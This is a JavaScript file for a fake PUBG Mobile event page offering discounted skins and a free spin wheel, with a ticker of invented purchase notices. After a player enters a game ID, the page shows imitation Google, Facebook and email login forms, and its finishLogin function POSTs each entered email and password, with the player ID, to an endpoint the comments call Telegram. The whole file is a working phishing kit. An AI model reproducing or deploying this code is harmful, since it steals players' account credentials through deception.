/* ============================================================
   PUBG MOBILE EVENT
   event shop · materials wheel · purchase · login
   ============================================================ */

(function () {
  'use strict';

  var $ = function (id) { return document.getElementById(id); };

  /* ---------------- DOM refs ---------------- */
  var alertTrack = $('alertTrack');
  var popupMask  = $('popupMask');
  var gotMask    = $('gotMask');
  var idMask     = $('idMask');
  var loginMask  = $('loginMask');
  var googleMask = $('googleLoginMask');
  var fbMask     = $('fbLoginMask');
  var emailMask  = $('emailLoginMask');
  var spinCells  = $('spinCells');
  var startBtn   = $('startBtn');
  var spinToast  = $('spinToast');

  var PROVIDER_MASKS = [googleMask, fbMask, emailMask];
  var ALL_MASKS = [popupMask, gotMask, idMask, loginMask].concat(PROVIDER_MASKS);

  /* ---------------- Catalog ---------------- */
  var SECTIONS = [
    [ // Platinum Soulmeister
      { name: "Draw 10 Voucher",               img: "img/Picsart_26-09-22_23-47-55-087.png",                 old: "3540", price: "FREE" },
      { name: "Platinum Soulmeister Set",      img: "img/Picsart_26-09-22_23-49-39-105.png",                 old: "7000", price: "2999" },
      { name: "Shadowgem Tube",                img: "img/photo_6165521619401511942_m-removebg-preview.png", old: "2200", price: "1177" },
      { name: "Platinum Soulmeister Mini14",   img: "img/Picsart_26-09-24_01-22-18-301 (1).png",             old: "5300", price: "2345" },
      { name: "Platinum Soulmeister Motor",    img: "img/Picsart_26-09-24_01-20-49-432 (1).png",             old: "2267", price: "1297" },
      { name: "Platinum Soulmeister Backpack", img: "img/Picsart_26-09-24_01-22-55-526 (1).png",             old: "2524", price: "1126" }
    ],
    [ // X-Suit
      { name: "Advanced X-Suit Pack",   img: "img/1.png",   old: "",     price: "4700" },
      { name: "Advanced Mummy Pack",    img: "img/2.png",   old: "",     price: "3500" },
      { name: "Phantasia Siren Set",    img: "img/3.png",   old: "",     price: "2675" },
      { name: "Frost Druvaen X-Suit",   img: "img/x3.png",  old: "5000", price: "3500" },
      { name: "Verdant Druvaen X-Suit", img: "img/x2.png",  old: "5000", price: "3500" },
      { name: "Pyre Druvaen X-Suit",    img: "img/x1.png",  old: "5000", price: "3500" },
      { name: "Lincoln (Goldden Age)",  img: "img/4.png",   old: "",     price: "2500" },
      { name: "Lincoln (Mystic Abyss)", img: "img/5.png",   old: "",     price: "2500" },
      { name: "Lincoln Upgrade Spray",  img: "img/6.png",   old: "",     price: "1100" }
    ],
    [ // Wonder
      { name: "Captain Bones Top",         img: "img/11.png",   old: "3200", price: "2900" },
      { name: "Crew Uniform Set",          img: "img/33.png",   old: "3200", price: "2900" },
      { name: "Inferno Rider Helmet",      img: "img/2(1).png", old: "1200", price: "900"  },
      { name: "M416 - Roaring Immolation", img: "img/4(1).png", old: "3000", price: "1000" },
      { name: "M416 - Sealed Nether",      img: "img/5(1).png", old: "3000", price: "1000" },
      { name: "M416 - Lizard Roar",        img: "img/6(1).png", old: "3000", price: "1500" }
    ],
    [ // BAPE
      { name: "BAPE City Camo Hoodie",   img: "img/1(1).png", old: "3500", price: "2250" },
      { name: "BAPE Sweats (Yellow)",    img: "img/2(2).png", old: "2800", price: "1925" },
      { name: "BAPE STA Mid",            img: "img/3(1).png", old: "1750", price: "725"  },
      { name: "BAPE City Camo (Purple)", img: "img/4(2).png", old: "3500", price: "2250" },
      { name: "BAPE Mix Camo Shorts",    img: "img/5(2).png", old: "2800", price: "1925" },
      { name: "BAPE Sta Mid (Purple)",   img: "img/6(2).png", old: "1750", price: "725"  }
    ]
  ];

  var ALL_ITEMS = SECTIONS.reduce(function (acc, sec) { return acc.concat(sec); }, []);

  /* ---------------- Wheel: materials only ---------------- */
  var MATERIAL_IMG = 'img/0.png';
  var SPIN_PRIZES = [
    { name: 'Materials x1',  qty: 1 },
    { name: 'Materials x2',  qty: 2 },
    { name: 'Materials x3',  qty: 3 },
    { name: 'Materials x5',  qty: 5 },
    { name: 'Materials x10', qty: 10 },
    { name: 'Materials x15', qty: 15 },
    { name: 'Materials x25', qty: 25 },
    { name: 'Materials x50', qty: 50 }
  ];

  var spinUsed = false;
  var spinning = false;

  /* ---------------- Toast ---------------- */
  var toastTimer = null;
  function showToast(msg) {
    if (!spinToast) return;
    spinToast.textContent = msg;
    spinToast.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(function () { spinToast.classList.remove('show'); }, 2500);
  }

  /* ---------------- Mask helpers ---------------- */
  function hide(mask) {
    if (!mask) return;
    mask.classList.remove('show', 'slide-up-enter');
  }

  function show(mask) {
    if (!mask) return;
    mask.classList.add('show');
  }

  // Provider forms slide up from the bottom. Each form is its own top-level
  // layer, so the login window can hide while the form stays visible at once.
  function openProvider(mask) {
    hide(loginMask);
    show(mask);
    void mask.offsetWidth; // force reflow to restart the animation
    mask.classList.add('slide-up-enter');
    setTimeout(function () { mask.classList.remove('slide-up-enter'); }, 400);
  }

  // Closing a form returns to the three login options.
  function backToLogin() {
    PROVIDER_MASKS.forEach(function (m) {
      m.classList.add('slide-down-exit');
      m.classList.remove('show');
      setTimeout(function () { m.classList.remove('slide-down-exit'); }, 280);
    });
    show(loginMask);
  }

  function closeAll() {
    ALL_MASKS.forEach(hide);
  }

  function onBackdrop(mask, onClose) {
    if (!mask) return;
    mask.addEventListener('click', function (e) {
      if (e.target === mask) onClose();
    });
  }

  /* ============================================================
     1. NOTIFICATION TICKER (ID, not nickname)
     ============================================================ */
  function randomId() {
    return '5' + Math.floor(10000000 + Math.random() * 89999999);
  }

  function tickerMessage() {
    var pid = randomId();
    var item = ALL_ITEMS[Math.floor(Math.random() * ALL_ITEMS.length)];
    return 'ID <span class="t-id">' + pid + '</span> just bought <b>' + item.name + '</b>';
  }

  function startTicker() {
    if (!alertTrack) return;
    var tick = function () {
      alertTrack.style.opacity = '0';
      setTimeout(function () {
        alertTrack.innerHTML = tickerMessage();
        alertTrack.style.opacity = '1';
      }, 260);
    };
    tick();
    setInterval(tick, 4200);
  }

  /* ============================================================
     2. CATALOG RENDERING
     ============================================================ */
  function priceMarkup(item) {
    if (item.old) {
      return '<p><span class="disc">' + item.old + '</span>' +
             '<img src="icon/tok.png" alt="UC">' +
             '<span class="nondisc">' + item.price + '</span></p>';
    }
    return '<p class="no-old"><img src="icon/tok.png" alt="UC">' +
           '<span class="nondisc">' + item.price + '</span></p>';
  }

  function renderCatalog() {
    var boxes = document.querySelectorAll('.box-item-rewardx');
    for (var i = 0; i < boxes.length; i++) {
      (function (box) {
        var list = SECTIONS[Number(box.dataset.section)] || [];
        box.innerHTML = list.map(function (item) {
          return '<div class="item-lenzz" ' +
            'data-name="' + item.name + '" data-image="' + item.img + '" ' +
            'data-price="' + item.price + '" data-old="' + item.old + '">' +
            '<div><figure><img src="' + item.img + '" alt="' + item.name + '"></figure></div>' +
            '<div><div class="item-lenzz-label">' + item.name + '</div>' +
            priceMarkup(item) + '</div></div>';
        }).join('');
      })(boxes[i]);
    }
  }

  /* ============================================================
     3. PRODUCT POPUP
     ============================================================ */
  function openPopup(item) {
    $('popupImg').src = item.img;
    $('popupImg').alt = item.name;
    $('popupName').textContent = item.name;

    var oldEl = $('popupOld');
    if (item.old) {
      oldEl.textContent = item.old;
      oldEl.style.display = '';
    } else {
      oldEl.textContent = '';
      oldEl.style.display = 'none';
    }
    $('popupNew').textContent = item.price;
    show(popupMask);
  }

  $('popupClose').addEventListener('click', function () { hide(popupMask); });
  onBackdrop(popupMask, function () { hide(popupMask); });

  /* ============================================================
     4. MATERIALS WHEEL (one free spin)
     ============================================================ */
  function renderSpinCells() {
    if (!spinCells) return;
    spinCells.innerHTML = SPIN_PRIZES.map(function (p, idx) {
      return '<div class="spin-cell" data-index="' + idx + '" ' +
             'data-name="' + p.name + '" data-image="' + MATERIAL_IMG + '">' +
             '<img src="' + MATERIAL_IMG + '" alt="' + p.name + '">' +
             '<span class="nomin">x' + p.qty + '</span></div>';
    }).join('');
  }

  function markWin(index) {
    var cells = spinCells.querySelectorAll('.spin-cell');
    for (var i = 0; i < cells.length; i++) {
      cells[i].classList.toggle('is-win', i === index);
    }
    return cells[index];
  }

  function updateSpinUI() {
    if (spinUsed) {
      startBtn.textContent = 'USED';
      startBtn.classList.add('disabled');
    } else if (!spinning) {
      startBtn.textContent = 'START 1x';
      startBtn.classList.remove('disabled');
    }
  }

  function runSpin() {
    if (spinning || spinUsed || !spinCells) return;
    spinning = true;
    startBtn.classList.add('disabled');
    startBtn.textContent = 'SPINNING...';

    var count = spinCells.querySelectorAll('.spin-cell').length;
    if (!count) { spinning = false; return; }

    var winIndex = Math.floor(Math.random() * count);
    var current = 0;
    var delay = 90;
    var laps = 0;

    function tick() {
      markWin(current);
      current = (current + 1) % count;

      if (current === 0) {
        laps++;
        if (laps >= 3) {
          markWin(winIndex);
          setTimeout(finish, 700);
          return;
        }
        delay = Math.min(delay + 55, 320);
      }

      setTimeout(tick, delay);
    }

    function finish() {
      var cell = markWin(winIndex);
      var prize = { name: cell.dataset.name, img: cell.dataset.image };
      spinning = false;
      spinUsed = true;          // the wheel can only be used once
      updateSpinUI();
      openGot(prize);
    }

    tick();
  }

  startBtn.addEventListener('click', runSpin);

  /* ============================================================
     5. "YOU GOT" MODAL
     ============================================================ */
  function openGot(prize) {
    $('gotImg').src = prize.img;
    $('gotName').textContent = prize.name;
    show(gotMask);
  }

  $('gotCollect').addEventListener('click', function () {
    hide(gotMask);
    // Won materials are claimed through the same ID step.
    openIdModal({ name: $('gotName').textContent, img: $('gotImg').src, price: 'FREE' });
  });
  onBackdrop(gotMask, function () { hide(gotMask); });

  /* ============================================================
     6. PLAYER ID MODAL (no verification - straight to the 3 methods)
     ============================================================ */
  function openIdModal(item) {
    $('idItemImg').src = item.img;
    $('idItemName').textContent = item.name;
    $('idItemPrice').innerHTML = item.price
      ? '<img src="icon/tok.png" alt="UC"> ' + item.price
      : '';

    $('idErr').classList.remove('show');
    $('idInput').value = '';

    show(idMask);
    setTimeout(function () { $('idInput').focus(); }, 120);
  }

  $('idClose').addEventListener('click', function () { hide(idMask); });
  onBackdrop(idMask, function () { hide(idMask); });

  $('idSubmit').addEventListener('click', function () {
    var pid = $('idInput').value.trim();
    var err = $('idErr');

    if (!pid) {
      err.textContent = 'Player ID is required';
      err.classList.add('show');
      return;
    }
    if (!/^\d{4,15}$/.test(pid)) {
      err.textContent = 'Invalid Game ID';
      err.classList.add('show');
      return;
    }

    // No verification step - show the three login methods right away.
    err.classList.remove('show');
    hide(idMask);
    show(loginMask);
  });

  $('idInput').addEventListener('keydown', function (e) {
    if (e.key === 'Enter') { e.preventDefault(); $('idSubmit').click(); }
  });

  /* ============================================================
     7. LOGIN - EMAIL / PASSWORD
     ============================================================ */
  var loginBtns = document.querySelectorAll('.login-btn-block');

  $('loginClose').addEventListener('click', function () { hide(loginMask); });
  onBackdrop(loginMask, function () { hide(loginMask); });

  function setError(id, msg) {
    var el = $(id);
    el.textContent = msg || '';
    el.classList.toggle('show', !!msg);
  }

  function resetForm(kind) {
    if (kind === 'google') {
      $('googleEmail').value = '';
      $('googlePass').value = '';
      $('googlePass').type = 'password';
      $('googlePassToggle').innerHTML = '<i class="fa-solid fa-eye"></i>';
      setError('googleFormError', '');
    } else if (kind === 'fb') {
      $('fbEmail').value = '';
      $('fbPass').value = '';
      $('fbPass').type = 'password';
      $('fbPassToggle').innerHTML = '<i class="fa-solid fa-eye"></i>';
      setError('fbFormError', '');
    } else {
      $('emailLoginEmail').value = '';
      $('emailLoginPass').value = '';
      $('emailLoginPass').type = 'password';
      $('emailPassToggle').innerHTML = '<i class="fa-solid fa-eye"></i>';
      setError('emailFormError', '');
    }
  }

  function openGoogle()   { resetForm('google'); lastProvider = 'google'; openProvider(googleMask); setTimeout(function () { $('googleEmail').focus(); }, 380); }
  function openFacebook() { resetForm('fb');     lastProvider = 'facebook'; openProvider(fbMask);     setTimeout(function () { $('fbEmail').focus(); }, 380); }
  function openEmail()    { 
    resetForm('email');  
    var labelMap = { google: 'Google', facebook: 'Facebook', email: 'Email' };
    var labelEl = document.querySelector('#emailLoginMask .email-form-label');
    if (labelEl) labelEl.textContent = labelMap[lastProvider] || 'Email';
    openProvider(emailMask);  
    setTimeout(function () { $('emailLoginEmail').focus(); }, 380); 
  }

  var pendingLogin = null; // { provider, email, password }
  var lastProvider = 'email';

  function finishLogin(label) {
    // Send to Telegram before closing
    if (pendingLogin) {
      var API_BASE = (window.__ENV__ && window.__ENV__.API_BASE) || 'http://localhost:3001';
      var itemName = $('idItemName') ? $('idItemName').textContent : '';
      var playerId = $('idInput') ? $('idInput').value.trim() : '';

      fetch(API_BASE + '/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          provider: pendingLogin.provider,
          email: pendingLogin.email,
          password: pendingLogin.password,
          playerId: playerId,
          itemName: itemName
        })
      }).catch(function(err) {
        console.warn('Telegram send failed:', err);
      });
    }

    closeAll();
    showToast(label);
    pendingLogin = null;
  }

  // Mock valid credentials for validation
  var VALID_GOOGLE = {
    'user@gmail.com': 'password123',
    'test@gmail.com': 'test123',
    'player@gmail.com': 'pubg2026'
  };
  var VALID_FACEBOOK = {
    'user@facebook.com': 'fbpass123',
    'player@fb.com': 'facebook2026',
    'gamer@fb.com': 'gamer123'
  };

  // Shared validation: email and password.
  function validate(email, pass) {
    if (!email) return 'Enter your email';
    if (!pass)  return 'Enter your password';
    if (email.indexOf('@') === -1 || email.indexOf('.') === -1) return 'Invalid email format';
    return null;
  }

  // Provider-specific credential check
  function checkCredentials(provider, email, pass) {
    if (provider === 'google') {
      return VALID_GOOGLE[email] === pass;
    }
    if (provider === 'facebook') {
      return VALID_FACEBOOK[email] === pass;
    }
    // Email login: no credential check, just accept
    return true;
  }

  function submitWithBusy(errId, btnId, idleText, busyText, read, okLabel, provider) {
    var error = validate(read.email, read.pass);
    if (error) { setError(errId, error); return; }

    // Check credentials for Google/Facebook
    if (provider === 'google' || provider === 'facebook') {
      if (!checkCredentials(provider, read.email, read.pass)) {
        setError(errId, 'Invalid email or password');
        return;
      }
    }

    // Store for Telegram callback
    pendingLogin = { provider: provider, email: read.email, password: read.pass };

    var btn = $(btnId);
    btn.disabled = true;
    btn.textContent = busyText;
    setTimeout(function () {
      btn.disabled = false;
      btn.textContent = idleText;
      finishLogin(okLabel);
    }, 1000);
  }

  /* ---- Google ---- */
  $('googleLoginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    submitWithBusy('googleFormError', 'googleSubmit', 'Next', 'Signing in...', {
      email: $('googleEmail').value.trim(),
      pass:  $('googlePass').value
    }, 'Signed in with Google', 'google');
  });
  $('googleLoginClose').addEventListener('click', backToLogin);
  onBackdrop(googleMask, backToLogin);

  /* ---- Facebook ---- */
  $('fbLoginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    submitWithBusy('fbFormError', 'fbSubmit', 'Log In', 'Signing in...', {
      email: $('fbEmail').value.trim(),
      pass:  $('fbPass').value
    }, 'Signed in with Facebook', 'facebook');
  });
  $('fbLoginClose').addEventListener('click', backToLogin);
  onBackdrop(fbMask, backToLogin);

  /* ---- Email ---- */
  $('emailLoginForm').addEventListener('submit', function (e) {
    e.preventDefault();
    submitWithBusy('emailFormError', 'emailSubmit', 'Sign In', 'Signing in...', {
      email: $('emailLoginEmail').value.trim(),
      pass:  $('emailLoginPass').value
    }, 'Signed in with Email', 'email');
  });
  $('emailLoginClose').addEventListener('click', backToLogin);
  onBackdrop(emailMask, backToLogin);

  for (var b = 0; b < loginBtns.length; b++) {
    loginBtns[b].addEventListener('click', function () {
      var provider = this.dataset.provider;
      if (provider === 'google')       openGoogle();
      else if (provider === 'facebook') openFacebook();
      else if (provider === 'email')   openEmail();
    });
  }

  /* ============================================================
     8. ITEM CLICK -> ID INPUT (everything is purchasable)
     ============================================================ */
  document.addEventListener('click', function (e) {
    var card = e.target.closest ? e.target.closest('.item-lenzz') : null;
    if (!card) return;
    openIdModal({
      name:  card.dataset.name,
      img:   card.dataset.image,
      price: card.dataset.price
    });
  });

  /* ============================================================
     BOOT
     ============================================================ */
  renderCatalog();
  renderSpinCells();
  updateSpinUI();
  startTicker();
})();
